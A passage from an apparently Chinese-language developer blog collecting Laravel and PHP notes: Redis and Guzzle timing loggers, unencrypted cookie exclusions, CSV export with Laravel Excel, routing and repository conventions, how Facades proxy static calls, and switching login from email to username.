class="string">'key'</span>] = isset($firtsArg) ?  $firtsArg  : <span class="string">' '</span>;</span><br><span class="line">        $log[<span class="string">'server'</span>] = <span class="string">"$direction $this"</span>;</span><br><span class="line">        $log[<span class="string">'time'</span>] = $timestamp;</span><br><span class="line">        dump([<span class="string">'rs'</span> =&gt; <span class="string">'redis://'</span> . trim($log[<span class="string">'server'</span>]), <span class="string">'cmd'</span> =&gt; $command-&gt;getId(),   <span class="string">'t_total'</span> =&gt; $timestamp]);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        $this-&gt;debugBuffer[] = &amp;$log;</span></span><br><span class="line">        unset($log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">writeRequest</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);<span class="comment">//执行命令行的时候重新算 这样就不会叠加</span></span><br><span class="line">        parent::writeRequest($command);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        $this-&gt;storeDebug($command, '-&gt;');</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">readResponse</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = parent::readResponse($command);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;storeDebug($command, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDebugBuffer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;debugBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = array(</span><br><span class="line">            <span class="string">'connections'</span> =&gt;[</span><br><span class="line">                <span class="string">'tcp'</span> =&gt; <span class="string">'\App\Services\RedisLog'</span>,</span><br><span class="line">            ],</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $client = <span class="keyword">new</span> \Predis\Client(config(<span class="string">'database.redis'</span>), $options);</span><br><span class="line">        $client-&gt;get(<span class="string">'redis:test'</span>);</span><br><span class="line"></span><br><span class="line">        var_export($client-&gt;getConnection());</span><br><span class="line">        <span class="comment">/* OUTPUT:</span></span><br><span class="line"><span class="comment">        array (</span></span><br><span class="line"><span class="comment">          0 =&gt; 'SELECT 15 -&gt; 127.0.0.1:6379 [0.0008s]',</span></span><br><span class="line"><span class="comment">          1 =&gt; 'SELECT 15 &lt;- 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          2 =&gt; 'SET foo -&gt; 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          3 =&gt; 'SET foo &lt;- 127.0.0.1:6379 [0.0011s]',</span></span><br><span class="line"><span class="comment">          4 =&gt; 'GET foo -&gt; 127.0.0.1:6379 [0.0013s]',</span></span><br><span class="line"><span class="comment">          5 =&gt; 'GET foo &lt;- 127.0.0.1:6379 [0.0015s]',</span></span><br><span class="line"><span class="comment">          6 =&gt; 'INFO -&gt; 127.0.0.1:6379 [0.0019s]',</span></span><br><span class="line"><span class="comment">          7 =&gt; 'INFO &lt;- 127.0.0.1:6379 [0.0022s]',</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录guggle运行时间"><a href="#记录guggle运行时间" class="headerlink" title="记录guggle运行时间"></a>记录guggle运行时间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use GuzzleHttp\Event\EmitterInterface;</span><br><span class="line">use GuzzleHttp\Event\BeforeEvent;</span><br><span class="line">use GuzzleHttp\Event\CompleteEvent;</span><br><span class="line">use GuzzleHttp\Event\EndEvent;</span><br><span class="line">use GuzzleHttp\Event\Emitter;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuzzleEmitter</span> <span class="keyword">extends</span> <span class="title">Emitter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$rs_info = <span class="string">'api_time'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $start = <span class="number">0</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'before'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">BeforeEvent $event, $name</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">EndEvent $event</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $url = $event-&gt;gettransferInfo()[<span class="string">'url'</span>];</span><br><span class="line">            $parse = parse_url($url);</span><br><span class="line">            <span class="keyword">if</span> ($event-&gt;getException()) &#123;</span><br><span class="line">                dump([<span class="string">'rs'</span> =&gt; $url, <span class="string">'ext1'</span> =&gt; sprintf(<span class="string">'%s://%s%s'</span>,$parse[<span class="string">'scheme'</span>],$parse[<span class="string">'host'</span>],$parse[<span class="string">'path'</span>]), <span class="string">'cmd'</span> =&gt; $event-&gt;getRequest()-&gt;getmethod(), <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],   <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>), <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>], <span class="string">'req_id'</span>=&gt;defined(<span class="string">'REQUEST_ID'</span>)?(REQUEST_ID):<span class="string">''</span>,]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $method=$event-&gt;getRequest()-&gt;getmethod();</span><br><span class="line">                $post_data=($method==<span class="string">'POST'</span>)?((string)$event-&gt;getRequest()-&gt;getBody()):<span class="string">''</span>;</span><br><span class="line">                dump([</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; $url,</span><br><span class="line">                    <span class="string">'cmd'</span> =&gt; $method,</span><br><span class="line">                    <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],</span><br><span class="line">                     <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>),</span><br><span class="line">                    <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>],</span><br><span class="line">                    <span class="string">'rs_content'</span>=&gt;$post_data,</span><br><span class="line">                    <span class="string">'ext1'</span> =&gt; sprintf(<span class="string">'%s://%s%s'</span>,$parse[<span class="string">'scheme'</span>],$parse[<span class="string">'host'</span>],$parse[<span class="string">'path'</span>]),</span><br><span class="line">                    <span class="string">'req_id'</span>=&gt;defined(<span class="string">'REQUEST_ID'</span>)?(REQUEST_ID):<span class="string">''</span>,</span><br><span class="line">                ]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="未加密的-Cookie"><a href="#未加密的-Cookie" class="headerlink" title="未加密的 Cookie"></a>未加密的 Cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">默认情况下，Laravel 生成的所有 cookie 都是经过加密和签名的，防止被非法篡改。但 Laravel 也支持不对 cookie 加密，具体做法如下：</span><br><span class="line"></span><br><span class="line">修改 app/Http/Middleware 目录中 App\Http\Middleware\EncryptCookies 中间件的 $except 属性，该属性是个数组，把不需加密的 cookie 名加入到该数组属性中就可以了：</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 不需要被加密的cookies名称</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @var array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">protected $except = [</span><br><span class="line">    <span class="string">'cookie_name'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<h3 id="无法获取-cookie"><a href="#无法获取-cookie" class="headerlink" title="无法获取 cookie"></a>无法获取 cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取cookie的三种尝试</span></span><br><span class="line">Cookie::get(<span class="string">'cookie_name'</span>);</span><br><span class="line">request()-&gt;cookie(<span class="string">'cookie_name'</span>);</span><br><span class="line">$request-&gt;cookie(<span class="string">'cookie_name'</span>)；</span><br><span class="line"><span class="comment">//返回值均为null laravel 设置 cookie 是加密之后的，而我获取的 cookie 是外来 cookie，由于解密失败，所以怎么获取都是空</span></span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/31939</span></span><br><span class="line"><span class="comment">//添加到cookie名称到 App\Http\Middleware\EncryptCookies 的 排除名单 中：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptCookies</span> <span class="keyword">extends</span> <span class="title">Middleware</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $except = [</span><br><span class="line">      <span class="string">'cookie_name'</span>,</span><br><span class="line">      ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel-导出-csv"><a href="#Laravel-Excel-导出-csv" class="headerlink" title="Laravel Excel 导出 csv"></a>Laravel Excel 导出 csv</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Laravel Excel <span class="number">2.0</span> 的版本和 <span class="number">3.0</span> 的版本有很大的区别，使用 composer 加载的时候要注意版本，<span class="number">3.0</span> 和 <span class="number">2.0</span> 的语法基本不同了</span><br><span class="line">composer <span class="built_in">require</span> maatwebsite/excel ~<span class="number">2.1</span></span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Maatwebsite\Excel\ExcelServiceProvider"</span>  </span><br><span class="line">config/excel.php 中找到 csv，把里面的 use_bom=&gt;<span class="literal">false</span> 改为 use_bom=&gt;<span class="literal">true</span>，这样导出的 csv 文件就会有 bom 头，不会出现乱码。</span><br><span class="line"></span><br><span class="line">Excel::create(iconv(<span class="string">'UTF-8'</span>, <span class="string">'GBK'</span>, <span class="string">'文章点赞数据'</span>),<span class="function"><span class="keyword">function</span> (<span class="params">$excel</span>) <span class="title">use</span>(<span class="params">$params</span>)</span>&#123;</span><br><span class="line">        $excel-&gt;sheet(<span class="string">'score'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">$sheet</span>) <span class="title">use</span>(<span class="params">$params</span>)</span>&#123;</span><br><span class="line">            $sheet-&gt;rows($params);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)-&gt;<span class="keyword">export</span>(<span class="string">'csv'</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32002</span></span><br><span class="line">按照 semver https:<span class="comment">//semver.org/lang/zh-CN/ 的规则，主版本号本来就是做不兼容 API 修改的，升级了主版本号，语法当然不一样了。这不算是坑，只是你不了解而已。</span></span><br><span class="line">https:<span class="comment">//github.com/rap2hpoutre/fast-excel  maatwebsite/excel 感觉太耗内存了</span></span><br></pre></td></tr></table></figure>
<h3 id="项目开发规范"><a href="#项目开发规范" class="headerlink" title="项目开发规范"></a>项目开发规范</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">常用的 HTTP 动词有下面五个。</span><br><span class="line"></span><br><span class="line">GET（SELECT）：从服务器取出资源（一项或多项）。</span><br><span class="line">POST（CREATE）：在服务器新建一个资源。</span><br><span class="line">PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</span><br><span class="line">PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</span><br><span class="line">DELETE（DELETE）：从服务器删除资源。</span><br><span class="line">所有 URL 必须 是全小写，所有的路由都要用 name</span><br><span class="line"></span><br><span class="line"> Route::get(<span class="string">'user/create'</span>,<span class="string">'UserController@create'</span>)-&gt;name(<span class="string">'admin.user.create'</span>);</span><br><span class="line">一个是打开 create 页面的请求，一个是 create 数据的请求，其中的路由规范如下：</span><br><span class="line"></span><br><span class="line">路由采用 reseful API 的设计规范</span><br><span class="line"></span><br><span class="line">        Route::get(<span class="string">'member/create'</span>, <span class="string">'MemberController@create'</span>)-&gt;name(<span class="string">'admin.member.create'</span>);</span><br><span class="line">        Route::post(<span class="string">'member/store'</span>, <span class="string">'MemberController@store'</span>)-&gt;name(<span class="string">'admin.member.store'</span>);</span><br><span class="line">ORM 的设计规范</span><br><span class="line"></span><br><span class="line">框架的 ORM 只单纯的做模型关联使用，另外新建 Repsitory 层做数据库的逻辑处理，</span><br><span class="line"></span><br><span class="line">Repsitory 的命名采用驼峰法命令规范，比如</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Repository\Admin;</span><br><span class="line">use App\Models\User;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRepository</span> </span>&#123;</span><br><span class="line">Controller 的设计规范</span><br><span class="line"></span><br><span class="line">数据验证在 request 层进行处理，保证进行控制器的数据是干净的。</span><br><span class="line">对于数据的处理则调用对应的 Repsitory 层处理，控制器只做响应和返回对应的数据。https:<span class="comment">//learnku.com/articles/32141</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-中-Facade"><a href="#Laravel-中-Facade" class="headerlink" title="Laravel 中 Facade"></a>Laravel 中 Facade</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">这里 Route 就是用 Facade 实现类方法 get 的静态调用。</span><br><span class="line"></span><br><span class="line">Laravel 中的 Facade 解决类什么问题？</span><br><span class="line"></span><br><span class="line">在 php 中，很多情况都需要使用一个容器获取到所有的对象，然后再调用改对象的方法，这样在编写代码的时候就会看到很长的一个调用链。例如:</span><br><span class="line">在 Yii2 中，几乎所有的系统类都是在 app 容器当中，对这些系统类进行操作都需要执行 Yii::$app-&gt;route 获取到类实例，然后在执行方法 Yii::$app-&gt;route-&gt;get()。但是如果用 Facade 实现之后的调用就是 Route::get()。这样的写法是的代码更加简洁。</span><br><span class="line"></span><br><span class="line">Laravel 中 Facade 是怎么实现的？</span><br><span class="line"></span><br><span class="line">思路是通过__callStatic 魔术方法将方法调用代理到实际的对象方法中去。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$resolvedInstance[$name])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$resolvedInstance[$name] = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//子类返回类名</span></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeAccessor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'router'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">根据每个 Facade 中提供的 getFacadeAccessor 返回实际的对象类名，获取类对象。每个类对象一旦创建，就放在一个静态数组中，因此在一次请求中最多只会被创建一次。</span><br><span class="line"></span><br><span class="line">有没有其他的实现方式？</span><br><span class="line"></span><br><span class="line">从上面的代码可以看到，其实核心就是一个静态代理的功能。那么有没有其他的实现方式了呢？</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> $instance;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFacadeRoot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::resolveFacadeInstance(<span class="keyword">static</span>::getFacadeAccessor());</span><br><span class="line">    &#125;</span><br><span class="line">    protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveFacadeInstance</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$instance)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">static</span>::$instance;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::$instance = <span class="keyword">static</span>::$app[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $instance = <span class="keyword">static</span>::getFacadeRoot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $instance) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'A facade root has not been set.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance-&gt;$method(...$args);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">Facade</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">可以看出，上面的方式也能够实现静态代理，类似于 Facade 的功能。都是通过魔术方法实现。作用上，都简化了代码编写。</span><br><span class="line"></span><br><span class="line">两种不同实现方式的区别</span><br><span class="line"></span><br><span class="line">第二种实现方式有一个很大的缺点，那就是必须继承 Facade 类。PHP 本身只能继承一个类，所以第二种实现方式对于一些需要继承其他类的对象是不适合的。https:<span class="comment">//learnku.com/articles/31964</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-默认邮箱登录改成用户名登录"><a href="#Laravel-默认邮箱登录改成用户名登录" class="headerlink" title="Laravel 默认邮箱登录改成用户名登录"></a>Laravel 默认邮箱登录改成用户名登录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">默认的，Laravel 使用的是 Illuminate\Foundation\Auth\AuthenticatesUsers 这个 trait 完成登录功能的。通过观察 AuthenticatesUsers 的代码，发现下面一段很有意思的代码:</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">validateLogin</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;validate($request, [</span><br><span class="line">            $<span class="keyword">this</span>-&gt;username() =&gt; <span class="string">'required|string'</span>,</span><br><span class="line">            <span class="string">'password'</span> =&gt; <span class="string">'required|string'</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'email'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">可以看到，是应为 trait 里定义了用户名就是 email，所以才会使得验证的时候通过用户邮箱验证。所以我们只需要定义一个 trait，覆盖 AuthenticatesUsers 中的 username() 方法即可实现后端代码通过用户名验证登录。</span><br><span class="line"></span><br><span class="line">新增的 trait 代码</span><br><span class="line"></span><br><span class="line">namespace App\Utils;</span><br><span class="line"></span><br><span class="line">use Illuminate\Foundation\Auth\AuthenticatesUsers <span class="keyword">as</span> LaravelAuthenticatesUsers;</span><br><span class="line">trait AuthenticatesUsers &#123;</span><br><span class="line">    use LaravelAuthenticatesUsers;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">username</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'name'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">其实还有另一个简单的修改方式，直接在 LoginController 中新增 username() 方法。由于当前定义方法会覆盖 trait 的方法，因此也能达到修改的目的。但是会破坏登录代码的整体一致性，所以最好还是通过新增 trait 的方式实现。</span><br><span class="line"></span><br><span class="line">同时要记得修改前端 blade 文件中对输入参数的验证，然后就可以使用用户名登录了 https:<span class="comment">//learnku.com/articles/32431</span></span><br></pre></td></tr></table></figure>
